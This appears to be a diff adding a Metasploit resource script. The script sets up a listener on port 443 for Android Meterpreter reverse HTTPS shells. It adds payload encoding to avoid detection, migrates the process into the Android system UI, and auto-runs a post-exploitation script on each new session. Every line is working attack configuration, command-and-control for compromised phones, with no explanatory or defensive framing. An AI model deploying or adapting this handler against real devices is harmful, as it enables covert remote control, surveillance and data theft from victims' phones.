@@ -1,0 +1,28 @@
+use exploit/multi/handler
+
+set PAYLOAD android/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+
+# SSL Configuration
+set HandlerSSLCert /root/.msf4/ssl/cert.pem
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+
+# Session Configuration  
+set SessionCommunicationTimeout 600
+set SessionExpirationTimeout 1200
+set SessionRetryTotal 50
+set SessionRetryWait 10
+set ExitOnSession false
+
+# Advanced Options
+set EnableUnicodeEncoding true
+set PrependMigrate true
+set PrependMigrateProc com.android.systemui
+
+# Auto-run scripts
+set AutoRunScript multi_console_command -rc /root/post_exploit_advanced.rc
+
+# Start handler
+exploit -j -z
